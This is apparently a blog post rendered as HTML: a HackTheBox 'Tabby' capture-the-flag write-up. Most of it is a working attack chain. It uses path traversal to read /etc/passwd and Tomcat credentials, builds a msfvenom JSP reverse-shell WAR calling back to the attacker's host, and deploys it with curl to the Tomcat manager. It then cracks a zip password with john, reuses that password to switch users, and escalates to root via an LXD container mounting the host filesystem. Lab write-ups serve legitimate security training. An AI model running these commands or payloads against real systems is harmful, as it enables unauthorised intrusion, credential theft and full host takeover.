+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="ss">:x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="ss">:www</span><span class="o">-</span><span class="n">data</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">backup</span><span class="ss">:x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="ss">\:backup\:/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">list</span><span class="ss">:x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="ss">:Mailing</span> <span class="no">List</span> <span class="no">Manager</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">list</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">irc</span><span class="ss">:x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="ss">\:ircd\:/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">gnats</span><span class="ss">:x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="ss">:Gnats</span> <span class="no">Bug</span><span class="o">-</span><span class="no">Reporting</span> <span class="no">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">)</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">nobody</span><span class="ss">:x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="ss">\:nobody\:/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="ss">:x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="ss">:systemd</span> <span class="no">Network</span> <span class="no">Management</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="ss">:x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="ss">:systemd</span> <span class="no">Resolver</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="ss">:x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="ss">:systemd</span> <span class="no">Time</span> <span class="no">Synchronization</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">messagebus</span><span class="ss">:x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">106</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">syslog</span><span class="ss">:x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">_apt</span><span class="ss">:x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tss</span><span class="ss">:x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">111</span><span class="ss">:TPM</span> <span class="n">software</span> <span class="n">stack</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">tpm</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">uuidd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">112</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">tcpdump</span><span class="ss">:x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">113</span><span class="o">::/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">landscape</span><span class="ss">:x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">115</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">pollinate</span><span class="ss">:x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">1</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">sshd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">65534</span><span class="o">::/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="ss">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="ss">:x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="ss">:systemd</span> <span class="no">Core</span> <span class="no">Dumper</span><span class="ss">:/:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+<span class="n">lxd</span><span class="ss">:x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">100</span><span class="o">::/</span><span class="n">var</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">lxd</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">tomcat</span><span class="ss">:x</span><span class="p">:</span><span class="mi">997</span><span class="p">:</span><span class="mi">997</span><span class="o">::/</span><span class="n">opt</span><span class="o">/</span><span class="n">tomcat</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">mysql</span><span class="ss">:x</span><span class="p">:</span><span class="mi">112</span><span class="p">:</span><span class="mi">120</span><span class="ss">:MySQL</span> <span class="no">Server</span><span class="p">,,,</span><span class="ss">:/</span><span class="n">nonexistent</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="kp">false</span>
+<span class="n">ash</span><span class="ss">:x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="ss">\:clive\:/</span><span class="n">home</span><span class="o">/</span><span class="n">ash</span><span class="ss">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</code></pre></div></div>
+
+<p>Now visiting the other part of the http webpage <code class="language-plaintext highlighter-rouge">8080</code>, which is a single page running tomcat server.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby3.png" alt=""></p>
+
+<p>Seeing that page, i felt that <code class="language-plaintext highlighter-rouge">LFI</code> should work on this page too.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">LFI</code> works in the right way as intended, then the <code class="language-plaintext highlighter-rouge">credentials</code> should be found in <code>tomcat-users.xml</code>.</p>
+
+<p>After a little bit of research and directory fuzzing I came to see that the correct path is <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/tomcat-users.xml</code></p>
+
+<p>Going to the <code class="language-plaintext highlighter-rouge">source-code</code> of the url: I was able to find the cred of the user.</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml </code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">"admin-gui"</span>/&gt;
+   &lt;role <span class="nv">rolename</span><span class="o">=</span><span class="s2">"manager-script"</span>/&gt;
+   &lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"tomcat"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3cureP4s5w0rd123</span><span class="s2">!"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"admin-gui,manager-script"</span>/&gt;
+</code></pre></div></div>
+<h2 id="getting-foothold">Getting Foothold</h2>
+
+<h2 id="time-for-creating-the-backdoor">Time for creating the backdoor.</h2>
+
+<h3 id="there-are-two-ways-of-doing-this-this-is-my-of-doing-it">There are two ways of doing this. This is my of doing it.</h3>
+
+<p>Uploading a payload as <code class="language-plaintext highlighter-rouge">.war</code> file can give us the reverse shell.</p>
+
+<h2 id="crafting-the-payload-with-msfvenom">Crafting the payload with msfvenom.</h2>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war</code></p>
+</blockquote>
+
+<p>Try to use <code class="language-plaintext highlighter-rouge">LPORT</code> as some thing other than <code class="language-plaintext highlighter-rouge">1234</code> because there are lot of users hacking the same machine!..</p>
+
+<h2 id="time-to-upload-the-payload-now">Time to upload the payload now.</h2>
+
+<p><code class="language-plaintext highlighter-rouge">curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.194:8080/manager/text/deploy?path=/payload.war"</code></p>
+
+<p>When you see <code class="language-plaintext highlighter-rouge">ok</code> that means the <code class="language-plaintext highlighter-rouge">payload</code> has been uploaded successfully.</p>
+
+<p><img src="/assets/img/sample/tabby/tabby4.png" alt=""></p>
+
+<p>Now set up listener <code class="language-plaintext highlighter-rouge">nc -lvnp 5566</code> and go to <code class="language-plaintext highlighter-rouge">tabby.htb:8080/payload.war</code> and you should get a <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+
+<p>use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")'</code> for the shell upgrade.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tomcat</span><span class="vi">@tabby</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span> <span class="n">ls</span>
+<span class="n">ls</span>
+<span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span>  <span class="n">archive</span>  <span class="n">revoked_certs</span>  <span class="n">statement</span>
+<span class="n">tomcat</span><span class="vi">@tabby</span><span class="ss">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation-to-user-ash">Privilege escalation to User <code class="language-plaintext highlighter-rouge">ASH</code>
+</h2>
+
+<p>Ennumeration on <code class="language-plaintext highlighter-rouge">/var/www/html</code> there is a folder called <code class="language-plaintext highlighter-rouge">files</code> which contains a <code class="language-plaintext highlighter-rouge">backup.zip</code> file <code class="language-plaintext highlighter-rouge">16162020_backup.zip</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tomcat</span><span class="o">@</span><span class="n">tabby</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<span class="n">total</span> <span class="mi">36</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">ash</span>  <span class="n">ash</span>  <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">17</span> <span class="mi">21</span><span class="p">:</span><span class="mi">59</span> <span class="p">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">17</span> <span class="mi">16</span><span class="p">:</span><span class="mi">24</span> <span class="p">..</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">ash</span>  <span class="n">ash</span>  <span class="mi">8716</span> <span class="n">Jun</span> <span class="mi">16</span> <span class="mi">13</span><span class="p">:</span><span class="mi">42</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nb">zip</span>
+</code></pre></div></div>
+
+<p>So I tried extracting it, but it is <code class="language-plaintext highlighter-rouge">password</code> protected.</p>
+
+<h2 id="cracking-the-password-with-john">Cracking the password with <code class="language-plaintext highlighter-rouge">JOHN</code>.</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">zip2john</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span> <span class="o">&gt;&gt;</span> <span class="n">backup</span><span class="o">-</span><span class="nb">hash</span>
+<span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span> <span class="n">is</span> <span class="n">not</span> <span class="n">encrypted!</span>
+<span class="n">ver</span> <span class="mf">1.0</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span> <span class="n">is</span> <span class="n">not</span> <span class="n">encrypted</span><span class="p">,</span> <span class="n">or</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">non</span><span class="o">-</span><span class="n">handled</span> <span class="n">compression</span> <span class="n">type</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">favicon</span><span class="p">.</span><span class="nf">ico</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">338</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">766</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">282</span><span class="no">B6DE2</span>
+<span class="n">ver</span> <span class="mf">1.0</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">files</span><span class="o">/</span> <span class="n">is</span> <span class="n">not</span> <span class="n">encrypted</span><span class="p">,</span> <span class="n">or</span> <span class="n">stored</span> <span class="n">with</span> <span class="n">non</span><span class="o">-</span><span class="n">handled</span> <span class="n">compression</span> <span class="n">type</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">php</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">3255</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">14793</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">285</span><span class="no">CC4D6</span>
+<span class="n">ver</span> <span class="mf">1.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">logo</span><span class="p">.</span><span class="nf">png</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">2906</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">2894</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">2</span><span class="no">F9F45F</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">news</span><span class="p">.</span><span class="nf">php</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">114</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">123</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">5</span><span class="no">C67F19E</span>
+<span class="n">ver</span> <span class="mf">2.0</span> <span class="n">efh</span> <span class="mi">5455</span> <span class="n">efh</span> <span class="mi">7875</span> <span class="mi">16162020</span><span class="n">_backup</span><span class="p">.</span><span class="nf">zip</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="no">Readme</span><span class="p">.</span><span class="nf">txt</span> <span class="no">PKZIP</span> <span class="no">Encr</span><span class="p">:</span> <span class="mi">2</span><span class="n">b</span> <span class="n">chk</span><span class="p">,</span> <span class="no">TS_chk</span><span class="p">,</span> <span class="n">cmplen</span><span class="o">=</span><span class="mi">805</span><span class="p">,</span> <span class="n">decmplen</span><span class="o">=</span><span class="mi">1574</span><span class="p">,</span> <span class="n">crc</span><span class="o">=</span><span class="mi">32</span><span class="no">DB9CE3</span>
+<span class="no">NOTE</span><span class="p">:</span> <span class="no">It</span> <span class="n">is</span> <span class="n">assumed</span> <span class="n">that</span> <span class="n">all</span> <span class="n">files</span> <span class="k">in</span> <span class="n">each</span> <span class="n">archive</span> <span class="n">have</span> <span class="n">the</span> <span class="n">same</span> <span class="n">password</span><span class="o">.</span>
+<span class="no">If</span> <span class="n">that</span> <span class="n">is</span> <span class="n">not</span> <span class="n">the</span> <span class="k">case</span><span class="p">,</span> <span class="n">the</span> <span class="nb">hash</span> <span class="n">may</span> <span class="n">be</span> <span class="n">uncrackable</span><span class="o">.</span> <span class="no">To</span> <span class="n">avoid</span> <span class="n">this</span><span class="p">,</span> <span class="n">use</span>
+<span class="n">option</span> <span class="o">-</span><span class="n">o</span> <span class="n">to</span> <span class="n">pick</span> <span class="n">a</span> <span class="n">file</span> <span class="n">at</span> <span class="n">a</span> <span class="n">time</span><span class="o">.</span>
+</code></pre></div></div>
+
+<p>Trying to crack the hash with the help of <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</p>
+
+<h3 id="john-backup-hash--wusrsharewordlistsrockyoutxt"><code class="language-plaintext highlighter-rouge">john backup-hash -w=/usr/share/wordlists/rockyou.txt</code></h3>
+
+<p>and the password is <code class="language-plaintext highlighter-rouge">admin@it </code>.</p>
+
+<h2 id="unzipping-the-file-with-the-password-found">Unzipping the file with the password found.</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip 16162020_backup.zip 
+Archive:  16162020_backup.zip
+   creating: var/www/html/assets/
+<span class="o">[</span>16162020_backup.zip] var/www/html/favicon.ico password: 
+  inflating: var/www/html/favicon.ico  
+   creating: var/www/html/files/
+  inflating: var/www/html/index.php  
+ extracting: var/www/html/logo.png   
+  inflating: var/www/html/news.php   
+  inflating: var/www/html/Readme.txt
+</code></pre></div></div>
+<h4 id="bad-luck-that-was-a-rabbit-hole">Bad luck! That was a <code class="language-plaintext highlighter-rouge">Rabbit hole</code>..</h4>
+
+<p>So I used the <code class="language-plaintext highlighter-rouge">password</code> <code class="language-plaintext highlighter-rouge">admin@it</code> with the user <code class="language-plaintext highlighter-rouge">ash</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">su</span> <span class="o">-</span> <span class="n">ash</span>
+<span class="n">Password</span><span class="p">:</span> <span class="n">admin</span><span class="o">@</span><span class="n">it</span>
+<span class="n">ash</span><span class="o">@</span><span class="n">tabby</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">ash</span>
+</code></pre></div></div>
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<p>ash@tabby:~$ cat user.txt
+cat user.txt
+d<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>1</p>
+
+<h2 id="privilege-escalation-to-root">Privilege Escalation to Root.</h2>
+
+<blockquote>
+  <p>Checking the id of <code class="language-plaintext highlighter-rouge">ash</code></p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">ash@tabby:~$ id
+id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</code></p>
+
+<h4 id="we-see-that-ash-is-part-of-lxd-group-so-according-to-article-httpswwwhackingarticlesinlxd-privilege-escalation-i-just-followed-the-steps-and-got-root-">We see that ash is part of lxd group. So according to article <code class="language-plaintext highlighter-rouge">https://www.hackingarticles.in/lxd-privilege-escalation/</code> I just followed the steps and got root .</h4>
+
+<h4 id="as-there-are-many-ways-on-priv-esc-using-lxd-i-took-help-of-hackingarticles-for-it">As there are many ways on priv esc using <code class="language-plaintext highlighter-rouge">LXD</code> I took help of <code class="language-plaintext highlighter-rouge">hackingarticles</code> for it.</h4>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">git</span> <span class="nb">clone</span>  <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">github</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">saghul</span><span class="o">/</span><span class="n">lxd</span><span class="o">-</span><span class="n">alpine</span><span class="o">-</span><span class="n">builder</span><span class="p">.</span><span class="nf">git</span>
+<span class="n">cd</span> <span class="n">lxd</span><span class="o">-</span><span class="n">alpine</span><span class="o">-</span><span class="n">builder</span>
+<span class="p">.</span><span class="nf">/</span><span class="n">build</span><span class="o">-</span><span class="n">alpine</span>
+
+</code></pre></div></div>
+
+<h4 id="you-will-get-a-targz-file-set-up-http-server-and-copy-it-to-the-remote-machine">You will get a <code class="language-plaintext highlighter-rouge">tar.gz</code> file. Set up http server and copy it to the remote machine.</h4>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 8080</code></p>
+</blockquote>
+
+<h4 id="on-another-hand-we-will-download-the-alpine-image-inside-tmp-directory-on-the-host-machine">On another hand we will download the alpine-image inside <code class="language-plaintext highlighter-rouge">/tmp</code> directory on the host machine.</h4>
+
+<blockquote>
+  <p>cd /tmp
+wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz</p>
+</blockquote>
+
+<h4 id="after-the-image-is-built-it-can-be-added-as-an-image-to-lxd-as-follows">After the image is built it can be added as an image to LXD as follows:</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz <span class="nt">--alias</span> myimage
+lxc image list
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init myimage ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
+</span>lxc config device add ignite mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
+</span>lxc start ignite
+lxc <span class="nb">exec </span>ignite /bin/sh
+<span class="nb">id</span>
+</code></pre></div></div>
+
+<p>``` shell	
+cd /mnt/root/root
+cd /mnt/root/root
+/mnt/root/root # cat root.txt
+cat root.txt
+3<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><em>**</em>5</p>
+
+<hr>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br>
+My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/hackthebox/2020/06/30/Blunder.html" title="HackTheBox Blunder">HackTheBox Blunder</a><a class="next" href="/tryhackme/2020/07/08/Haskhell.html" title="Tryhackme Haskhell">Tryhackme Haskhell</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/tryhackme/2020/03/29/Mrrobot.html" title="Tryhackme Haskhell">Tryhackme MrRobot</a></li>
+<li><a class="post-link" href="/tryhackme/2020/07/08/Haskhell.html" title="Tryhackme Haskhell">Tryhackme Haskhell</a></li>
+<li><a class="post-link" href="/hackthebox/2020/06/26/Cascade.html" title="Tryhackme Haskhell">HackTheBox Cascade</a></li>
+<li><a class="post-link" href="/hackthebox/2020/07/11/Blackfield.html" title="Tryhackme Haskhell">Hackthebox Blackfiled</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
+
+<div class="post-menu">
+  <div class="post-menu-title"> Contents</div>
+  <div class="post-menu-content"></div>
+</div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
